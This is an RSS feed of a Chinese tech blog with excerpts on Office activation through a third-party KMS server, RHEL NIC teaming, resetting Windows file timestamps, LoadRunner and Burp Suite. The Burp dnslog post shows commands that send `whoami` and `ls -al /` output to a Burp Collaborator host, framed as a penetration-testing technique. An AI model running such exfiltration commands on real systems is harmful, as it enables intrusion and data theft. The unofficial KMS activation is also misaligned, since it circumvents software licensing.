<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on runshell</title><link>https://runshell.github.io/post/</link><description>Recent content in Posts on runshell</description><generator>Hugo</generator><language>zh-CN</language><lastBuildDate>Mon, 05 May 2025 14:30:00 +0800</lastBuildDate><atom:link href="https://runshell.github.io/post/index.xml" rel="self" type="application/rss+xml"/><item><title>office 下载安装激活</title><link>https://runshell.github.io/post/%E5%9F%BA%E7%A1%80%E8%BF%90%E7%BB%B4/office-%E4%B8%8B%E8%BD%BD%E5%AE%89%E8%A3%85%E6%BF%80%E6%B4%BB/</link><pubDate>Mon, 05 May 2025 14:30:00 +0800</pubDate><guid>https://runshell.github.io/post/%E5%9F%BA%E7%A1%80%E8%BF%90%E7%BB%B4/office-%E4%B8%8B%E8%BD%BD%E5%AE%89%E8%A3%85%E6%BF%80%E6%B4%BB/</guid><description>&lt;h2 id="下载">下载&lt;/h2>
&lt;p>以下地址非官网地址，但下载地址为官网地址，可放心下载。选择适合的语言和版本。&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-url" data-lang="url">https://gravesoft.dev/office_c2r_links#chinese-simplified-zh-cn
&lt;/code>&lt;/pre>&lt;h2 id="安装">安装&lt;/h2>
&lt;p>解压或挂载后，运行&lt;code>setup.exe&lt;/code>或&lt;code>Office\Setup64.exe&lt;/code>，等待安装完成。&lt;/p>
&lt;h2 id="激活">激活&lt;/h2>
&lt;h3 id="转换">转换&lt;/h3>
&lt;p>将 office 转换成 vol 版本，才可使用 kms 激活。以管理员身份打开命令行，执行：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bat" data-lang="bat">&lt;span style="display:flex;">&lt;span>@&lt;span style="color:#75715e">rem 进入office ospp.vbs文件所在目录&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">cd&lt;/span> &lt;span style="color:#e6db74">&amp;#34;C:\Program Files\Microsoft Office\Office16&amp;#34;&lt;/span> || &lt;span style="color:#66d9ef">cd&lt;/span> &lt;span style="color:#e6db74">&amp;#34;C:\Program Files (x86)\Microsoft Office\Office16&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>@&lt;span style="color:#75715e">rem ProPlus2024为office版本，修改为你需要激活的版本即可，有哪些版本可查看..\root\Licenses16 目录&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">for&lt;/span> %x &lt;span style="color:#66d9ef">in&lt;/span> (dir /b ..\root\Licenses16\ProPlus2024VL_*.xrm-ms) &lt;span style="color:#66d9ef">do&lt;/span> cscript ospp.vbs /inslic:&lt;span style="color:#e6db74">&amp;#34;..\root\Licenses16\&lt;/span>&lt;span style="color:#ae81ff">%%&lt;/span>&lt;span style="color:#e6db74">x&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="gvlk">gvlk&lt;/h3>
&lt;p>从微软官方文档中获取对应版本的产品密钥，用于下一步激活&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-url" data-lang="url">https://learn.microsoft.com/zh-cn/office/volume-license-activation/gvlks
&lt;/code>&lt;/pre>&lt;h3 id="kms-激活">kms 激活&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bat" data-lang="bat">&lt;span style="display:flex;">&lt;span>@&lt;span style="color:#75715e">rem 注意跟换XJ2XN-FW8RK-P4HMP-DKDBV-GCVGB为上一步查询到的key&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cscript ospp.vbs /inpkey:XJ2XN-FW8RK-P4HMP-DKDBV-GCVGB
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>@&lt;span style="color:#75715e">rem 设置kms服务器，此处以kms.03k.org为例&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cscript ospp.vbs /sethst:kms.03k.org
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>@&lt;span style="color:#75715e">rem 激活&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cscript ospp.vbs /act
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>RHEL 8.10端口聚合</title><link>https://runshell.github.io/post/%E5%9F%BA%E7%A1%80%E8%BF%90%E7%BB%B4/rhel-8.10%E7%AB%AF%E5%8F%A3%E8%81%9A%E5%90%88/</link><pubDate>Mon, 05 May 2025 14:30:00 +0800</pubDate><guid>https://runshell.github.io/post/%E5%9F%BA%E7%A1%80%E8%BF%90%E7%BB%B4/rhel-8.10%E7%AB%AF%E5%8F%A3%E8%81%9A%E5%90%88/</guid><description>&lt;h1 id="创建聚合组">创建聚合组&lt;/h1>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># lacp 逐流负载&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nmcli connection add type team con-name team0 ifname team0 config &lt;span style="color:#e6db74">&amp;#39;{&amp;#34;runner&amp;#34;: {&amp;#34;name&amp;#34;: &amp;#34;lacp&amp;#34;, &amp;#34;tx_hash&amp;#34;: [&amp;#34;eth&amp;#34;, &amp;#34;ipv4&amp;#34;, &amp;#34;tcp&amp;#34;, &amp;#34;udp&amp;#34;]}}&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="配置聚合组">配置聚合组&lt;/h1>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 将接口eno2和eno3添加到聚合组team0中&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nmcli connection add type team-slave con-name team0-port1 ifname eno2 master team0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nmcli connection add type team-slave con-name team0-port2 ifname eno3 master team0
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="配置-ip-地址">配置 IP 地址&lt;/h1>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 根据实际情况配置IP，配置静态IP&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nmcli connection modify team0 ipv4.addresses 192.168.2.2/24
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nmcli connection modify team0 ipv4.method manual
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 配置自动获取&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># nmcli connection modify team0 ipv4.method auto&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="启动聚合组">启动聚合组&lt;/h1>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>nmcli connection up team0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nmcli connection up team0-port1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nmcli connection up team0-port2
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="设置-team0-连接为开机自动激活">设置 team0 连接为开机自动激活&lt;/h1>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>nmcli connection modify team0 connection.autoconnect yes
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nmcli connection modify team0-port1 connection.autoconnect yes
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nmcli connection modify team0-port2 connection.autoconnect yes
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>windows修改文件时间戳</title><link>https://runshell.github.io/post/%E5%9F%BA%E7%A1%80%E8%BF%90%E7%BB%B4/windows%E4%BF%AE%E6%94%B9%E6%96%87%E4%BB%B6%E6%97%B6%E9%97%B4%E6%88%B3/</link><pubDate>Wed, 15 Jul 2020 14:30:00 +0800</pubDate><guid>https://runshell.github.io/post/%E5%9F%BA%E7%A1%80%E8%BF%90%E7%BB%B4/windows%E4%BF%AE%E6%94%B9%E6%96%87%E4%BB%B6%E6%97%B6%E9%97%B4%E6%88%B3/</guid><description>&lt;ul>
&lt;li>powershell&lt;/li>
&lt;/ul>
&lt;p>使用Set-ItemProperty来修改文件属性，-name参数指定属性名，-value参数指定参数值。时间格式为&lt;code>2018-08-25 15:23:36&lt;/code>,如果选用当前时间可直接使用命令&lt;code>date&lt;/code>代替时间。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-text" data-lang="text">&lt;span style="display:flex;">&lt;span>PS C:\Users\HUAWEI\Desktop&amp;gt; Get-ItemProperty -Path .\1.jsp | fl
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Name : 1.jsp
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Length : 2598
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>CreationTime : 2020/8/24 14:29:10
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LastWriteTime : 2020/8/24 14:29:10
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LastAccessTime : 2020/11/6 14:54:12
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Mode : -a----
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LinkType :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Target : {}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>VersionInfo : File: C:\Users\HUAWEI\Desktop\1.jsp
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> InternalName:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> OriginalFilename:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> FileVersion:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> FileDescription:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Product:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ProductVersion:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Debug: False
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Patched: False
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> PreRelease: False
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> PrivateBuild: False
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> SpecialBuild: False
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Language:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PS C:\Users\HUAWEI\Desktop&amp;gt; Set-ItemProperty -Path .\1.jsp -Name CreationTime -Value &amp;#39;2020年11月6日 14:56:25&amp;#39;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PS C:\Users\HUAWEI\Desktop&amp;gt; Get-ItemProperty -Path .\1.jsp | fl
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 目录: C:\Users\HUAWEI\Desktop
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Name : 1.jsp
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Length : 2598
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>CreationTime : 2020/11/6 14:56:25
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LastWriteTime : 2020/8/24 14:29:10
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LastAccessTime : 2020/11/6 14:57:36
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Mode : -a----
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LinkType :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Target : {}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>VersionInfo : File: C:\Users\HUAWEI\Desktop\1.jsp
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> InternalName:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> OriginalFilename:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> FileVersion:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> FileDescription:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Product:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ProductVersion:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Debug: False
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Patched: False
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> PreRelease: False
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> PrivateBuild: False
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> SpecialBuild: False
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Language:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PS C:\Users\HUAWEI\Desktop&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>c/c++&lt;/li>
&lt;/ul>
&lt;p>在不了解powershell的时候，没有找到很好的工具来修改文件时间戳，于是有了下面的代码，用户交互上完全模仿linux中的touch。所以用法和linux中touch相同。&lt;br>
该程序本质是调用&lt;code>SetFileTime(f,ct,at,mt)&lt;/code>函数修改时间戳，一大把的代码都在做参数解析，真正实现修改时间戳的就这一个函数。&lt;/p></description></item><item><title>Loadrunner12 使用基础教程</title><link>https://runshell.github.io/post/%E5%9F%BA%E7%A1%80%E8%BF%90%E7%BB%B4/loadrunner12-%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/</link><pubDate>Mon, 15 Jul 2019 14:30:00 +0800</pubDate><guid>https://runshell.github.io/post/%E5%9F%BA%E7%A1%80%E8%BF%90%E7%BB%B4/loadrunner12-%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/</guid><description>&lt;h2 id="1-安装略">1. 安装（略）&lt;/h2>
&lt;ul>
&lt;li>程序安装包&lt;/li>
&lt;/ul>
&lt;p>HP_LoadRunner_12.02_Community_Edition_T7177-15059.exe&lt;/p>
&lt;ul>
&lt;li>语言包&lt;/li>
&lt;/ul>
&lt;p>HP_LoadRunner_12.02_Community_Edition_Language_Packs_T7177-15062.exe&lt;/p>
&lt;h2 id="2-使用简介">2. 使用简介&lt;/h2>
&lt;p>​	安装完成后，桌面上新增3个图标，分别是&lt;code>Virtual User Generator&lt;/code>、 &lt;code>Controller&lt;/code> 、&lt;code>Analysis&lt;/code> 。&lt;/p>
&lt;p>&lt;img src="https://runshell.github.io/images/loadrunner_img1.jpg" alt="">&lt;/p>
&lt;h3 id="21-录制脚本">2.1 录制脚本&lt;/h3>
&lt;p>​	打开&lt;code>Virtual User Generator&lt;/code> ，使用组合键&lt;code>Ctrl&lt;/code>+&lt;code>N&lt;/code>打开如下对话框，选择&lt;code>单协议&lt;/code>→&lt;code>Web-HTTP/HTML&lt;/code>，填写脚本名称和保存位置后，点击创建。&lt;/p>
&lt;p>&lt;img src="https://runshell.github.io/images/new_script.jpg" alt="">&lt;/p>
&lt;blockquote>
&lt;p>创建后到达如下界面，可以发先操作分3类，分别为&lt;code>vuser_init&lt;/code>、&lt;code>Action&lt;/code>、&lt;code>vuser_end&lt;/code>。他们的区别在于&lt;code>vuser_init&lt;/code>只运行一次，在启动运行场景后最先运行；在&lt;code>vuser_init&lt;/code>部分运行完后，&lt;code>Action&lt;/code>根据运行场景的设置，多次并发运行；&lt;code>Action&lt;/code>运行结束后，运行场景结束前运行&lt;code>vuser_end&lt;/code>，也只运行一次。通常来说，&lt;code>vuser_init&lt;/code>录制登录操作，&lt;code>Action&lt;/code>部分录制需要测试并发的业务操作，&lt;code>vuser_end&lt;/code>部分录制最后登出注销之类的释放资源的操作。&lt;/p>&lt;/blockquote>
&lt;p>&lt;img src="https://runshell.github.io/images/operate.png" alt="">&lt;/p>
&lt;p>​	录制vuser_init：选中vuser_init，按组合键&lt;code>Ctrl&lt;/code>+&lt;code>R&lt;/code>打开如下对话框，配置好url等相关参数后点击开始录制。Loadrunner会自动打开您选择的浏览器并访问您指定的URL。&lt;/p>
&lt;p>&lt;img src="https://runshell.github.io/images/vuser_init.png" alt="1551752491440">&lt;/p>
&lt;p>【注】如果出现下图错误，请确认网络是否正常，网络正常即可忽略该错误。&lt;/p>
&lt;p>&lt;img src="https://runshell.github.io/images/net_error.png" alt="1551686888809">&lt;/p>
&lt;p>​	输入用户名密码进行正常登录，&lt;/p>
&lt;p>&lt;img src="https://runshell.github.io/images/login.png" alt="1551752859139">&lt;/p>
&lt;p>​	登录完成后，将操作切换为Action，继续进行收件操作，如果还想测试其它事件场景，点击右侧加号，添加新的事件场景。需要测试的场景录制完成后，将操作切换至vuser_end，录制注销操作。录制完成后点击终止按钮结束录制。&lt;/p>
&lt;h3 id="22-运行脚本">2.2 运行脚本&lt;/h3>
&lt;p>​	录制完成后打开&lt;code>Controller&lt;/code>，选中刚才录制的脚本，点击添加，然后点击&lt;code>确定&lt;/code>按钮，进入场景配置界面。&lt;/p>
&lt;p>&lt;img src="https://runshell.github.io/images/run_script.png" alt="1551756887458">&lt;/p>
&lt;h4 id="221-场景配置">2.2.1 场景配置&lt;/h4>
&lt;p>​	加载生成器，由于&lt;code>Virtual User Generator&lt;/code>与&lt;code>Controller&lt;/code>在同一计算机，所以添加一个localhost的生成器，确定即可。&lt;/p>
&lt;p>&lt;img src="https://runshell.github.io/images/load_generator.png" alt="1551757110771">&lt;/p>
&lt;p>​	配置全局计划，配置初始化方式、启动的vuser个数以及启动的时间、测试持续时间等。&lt;/p>
&lt;p>&lt;img src="https://runshell.github.io/images/global.png" alt="1551757309957">&lt;/p>
&lt;h4 id="222-监视服务器资源">2.2.2 监视服务器资源&lt;/h4>
&lt;p>​	点击底部的&lt;code>运行&lt;/code>标签，切换至如下界面，根据服务器操作系统类型，选择&lt;code>Windows资源&lt;/code>或&lt;code>UNIX资源&lt;/code>，右击最右下角的统计图，在右击菜单中选择&lt;code>添加度量&lt;/code>，到达服务器信息配置界面。&lt;/p>
&lt;p>&lt;img src="https://runshell.github.io/images/monitor.png" alt="1551757770639">&lt;/p>
&lt;h4 id="2221-linux">2.2.2.1 Linux&lt;/h4>
&lt;ol>
&lt;li>在Linux服务器上安装并启动rstatd&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>apt-get install rstatd#安装rstatd
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>service rpcbind start &lt;span style="color:#75715e">#启动rpc服务&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>rpc.rstatd			 &lt;span style="color:#75715e">#启动rpc.rstatd服务&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>rpcinfo -p			 &lt;span style="color:#75715e">#查看服务状态和端口&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://runshell.github.io/images/rstatd_status.png" alt="img">&lt;/p>
&lt;ol start="2">
&lt;li>在Controller中添加资源视图，添加时，注意带上rstatd服务所监听的端口。&lt;/li>
&lt;/ol>
&lt;p>&lt;img src="https://runshell.github.io/images/Linux.png" alt="1551773072125">&lt;/p></description></item><item><title>Burp suite中的dnslog</title><link>https://runshell.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/burp-suite%E4%B8%AD%E7%9A%84dnslog/</link><pubDate>Sun, 15 Jul 2018 14:30:00 +0800</pubDate><guid>https://runshell.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/burp-suite%E4%B8%AD%E7%9A%84dnslog/</guid><description>&lt;p>[注]本文提到的burp均为付费专业版，免费社区版不具有该功能。&lt;/p>
&lt;h2 id="0x00-什么是dnslog">0x00 什么是dnslog&lt;/h2>
&lt;p>dnslog，顾名思义，就是dns服务产生的日志。有什么用呢？我们可以用子域名来携带出信息。&lt;/p>
&lt;p>这种套路主要用于渗透测试中的盲打。执行系统命令没有回显的时候，sql盲注的时候，xss想将cookie带出来的时候……将你想得到的信息放在自己的域名前面作为子域名，dns服务器解析该域名时产生的日志中将会包含整个域名。如果携带的信息太长，可能dns就携带不了了，好在通常dnslog平台同时也提供http日志，可以使用http请求携带更多信息。&lt;/p>
&lt;h2 id="0x01-burp-suite中的dnslog功能">0x01 burp suite中的dnslog功能&lt;/h2>
&lt;p>&lt;strong>Collaborator client&lt;/strong> ，相比Burp中的&lt;code>proxy&lt;/code>、&lt;code>instruder&lt;/code>、&lt;code>scanner&lt;/code>等功能，这个功能可能鲜为人知了吧！启动位置如下图，&lt;code>Butp&lt;/code>→&lt;code>Burp Collaborator client&lt;/code>。&lt;/p>
&lt;p>&lt;img src="https://runshell.github.io/images/1536408720503.png" alt="Collaborator">&lt;/p>
&lt;p>启动Collaborator client后显示如下页面，burp会分配给我们一个三级域名，点击&lt;code>Copy to clipbord&lt;/code>可以将域名复制到粘贴板，如&lt;code>p1rf8orun99jx1pa9ayqx55quh07ow.burpcollaborator.net&lt;/code> 。&lt;/p>
&lt;p>&lt;img src="https://runshell.github.io/images/1536409490993.png" alt="1536409490993">&lt;/p>
&lt;p>下面举个简单的例子，在Linux shell中执行如下命令：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>ping &lt;span style="color:#e6db74">`&lt;/span>whoami&lt;span style="color:#e6db74">`&lt;/span>.p1rf8orun99jx1pa9ayqx55quh07ow.burpcollaborator.net
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>点击Collaborator client窗口中的Poll now获取dnslog，如下图，在log条目区域显示两条日志，在下面的日志详情中我们看到了从子域名中携带出了&lt;code>whoami&lt;/code>的执行结果。&lt;/p>
&lt;p>&lt;img src="https://runshell.github.io/images/1536409951024.png" alt="1536409951024">&lt;/p>
&lt;p>如果想执行ls查看根目录有哪些文件，用dns携带不了那么多信息，转而使用http请求，执行如下命令：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>curl p1rf8orun99jx1pa9ayqx55quh07ow.burpcollaborator.net -d &lt;span style="color:#e6db74">&amp;#34;`ls -al /`&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>再次点击Collaborator client窗口中的Poll now获取log，我们可以在log区看到一条http日志，我们查看请求原始信息可以看到请求体中携带出了&lt;code>ls -al /&lt;/code>的执行结果。&lt;/p>
&lt;p>&lt;img src="https://runshell.github.io/images/1536410609261.png" alt="1536410609261">&lt;/p>
&lt;p>有没有觉得明文携带这些信息太不安全了？可是使用https安全传送，例如：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>curl https://p1rf8orun99jx1pa9ayqx55quh07ow.burpcollaborator.net -d &lt;span style="color:#e6db74">&amp;#34;`ls -al /`&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>最后的结果和使用http一样。burp的dnslog功能也是相当全的。&lt;/p>
&lt;h2 id="0x02-私有的collaborator-server">0x02 私有的Collaborator server&lt;/h2>
&lt;p>上面举例的是使用burp的公共Collaborator server，有时我们需要使用私有的Collaborator server。使用公共的Collaborator server，但是，信息存储在别人的服务器上是没有保密性可言的。还有一种情况，就是需要渗透的目标在内网且不与外网互通的情况下，就得使用私有的Collaborator server。&lt;/p>
&lt;p>下面我们来看看如何搭建私有的Collaborator server。burp提供了搭建Collaborator server的功能，在服务器上执行&lt;code>sudo java -jar burp.jar --collaborator-server&lt;/code> 即带&lt;code>--collaborator-server&lt;/code>参数运行burp即可启动服务。&lt;/p>
&lt;p>然后在客户端配置，以此打开&lt;code>Project options&lt;/code>→&lt;code>Misc&lt;/code>→&lt;code>Burp Collaborator server&lt;/code> ，选择&lt;code>Use a private Collaborator server&lt;/code> ，在&lt;code>Server location&lt;/code>中设置服务器域名，没有域名的情况下可以使用IP，如果按IP地址指定服务器，则无法使用依赖于DNS解析的Burp与Collaborator相关的功能。 另外，默认情况下，Burp通过HTTPS轮询Collaborator服务器，并强制实施SSL信任以防止中间人攻击。如果您的Burp实例由于网络或其他限制而无法通过HTTPS直接轮询，您可以选择轮询未加密的HTTP。由于没有配置ssl证书，所以此处勾选&lt;code>Poll over unencrypted HTTP&lt;/code>即使用未加密的http轮询。详情如下图：&lt;/p></description></item><item><title>Burp中匹配中文</title><link>https://runshell.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/burp%E4%B8%AD%E5%8C%B9%E9%85%8D%E4%B8%AD%E6%96%87/</link><pubDate>Sun, 15 Jul 2018 14:30:00 +0800</pubDate><guid>https://runshell.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/burp%E4%B8%AD%E5%8C%B9%E9%85%8D%E4%B8%AD%E6%96%87/</guid><description>&lt;p>**问题：**Burp中有很多地方可以进行正则匹配，比如Instruder模块中筛选响应包，proxy模块中匹并配替换字符串。中文在匹配的时候，添加进匹配列表就变身了，关键是与数据包内的相应字符不能匹配。&lt;/p>
&lt;p>&lt;strong>解决办法：&lt;/strong>&lt;/p>
&lt;ol>
&lt;li>在user option中设置字符集(character sets)为显示原始字节流(Display as raw bytes);&lt;/li>
&lt;/ol>
&lt;p>&lt;img src="..//images/image1.png" alt="image1">&lt;/p>
&lt;ol start="2">
&lt;li>在响应包中复制要匹配的中文，显示的是乱码；&lt;/li>
&lt;/ol>
&lt;p>&lt;img src="..//images/image2.png" alt="image2">&lt;/p>
&lt;ol start="3">
&lt;li>将复制的乱码粘贴到添加匹配字符串的地方。&lt;/li>
&lt;/ol>
&lt;p>&lt;img src="..//images/image3.png" alt="image3">&lt;/p></description></item><item><title>curl详解</title><link>https://runshell.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/curl%E8%AF%A6%E8%A7%A3/</link><pubDate>Sun, 15 Jul 2018 14:30:00 +0800</pubDate><guid>https://runshell.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/curl%E8%AF%A6%E8%A7%A3/</guid><description>&lt;h2 id="0x00-前言">0x00 前言&lt;/h2>
&lt;p>在渗透测试中经常需要在艰难的环境下执行命令，比如没有回显。为了摆脱困境，经常需要传送文件。curl是一个非常厉害的工具，在绝大多数情况下，linux系统中是存在curl的。此外Windows系统中，powershell4.0及其以后的版本中提供了一个cmlet——&lt;code>Invoke-WebRequest&lt;/code>，其别名之一是curl。所以，简单记录一下curl的用法。&lt;/p>
